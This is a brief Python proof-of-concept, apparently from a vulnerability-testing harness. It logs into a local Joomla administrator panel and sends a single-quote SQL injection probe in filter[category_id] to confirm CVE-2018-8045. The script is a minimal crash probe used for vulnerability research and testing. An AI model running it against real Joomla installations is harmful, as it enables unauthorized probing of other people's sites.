#!/usr/bin/env python3
"""
[APP] Joomla 
[CVE] CVE-2018-8045 
[TYPE] SQL injection
[METHOD] POST
[CRASH_FIELDS] filter[category_id]
[TARGET_URL] http://localhost/joomla/administrator/index.php
[PARAMS] option=com_users&view=notes&filter[search]=&list[fullordering]=a.review_time DESC&list[limit]=20&filter[published]=1&filter[category_id]='
Joomla SQL injection vulnerability that requires administrator authentication
First login to /administrator/index.php, then POST to /administrator/index.php?option=com_users&view=notes
"""

import sys
import os

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # CVE-2018-8045 specific configuration
    base_url = 'http://localhost/joomla'
    login_path = '/administrator/index.php'
    
    # Login payload
    login_payload = {
        'username': 'admin',
        'passwd': 'pass',
        'option': 'com_login',
        'task': 'login'
    }
    
    # POC target URL and payload
    poc_url = 'http://localhost/joomla/administrator/index.php?option=com_users&view=notes'
    poc_payload = {
        'option': 'com_users',
        'view': 'notes',
        'filter[search]': '',
        'list[fullordering]': 'a.review_time DESC',
        'list[limit]': '20',
        'filter[published]': '1',
        'filter[category_id]': "'"  # SQL injection payload - single quote
    }
    
    # Run authenticated POC test using the helper function
    exit_code = run_authenticated_poc(
        base_url=base_url,
        login_path=login_path,
        login_payload=login_payload,
        poc_url=poc_url,
        poc_payload=poc_payload,
        method=metadata['method'],
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type']
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
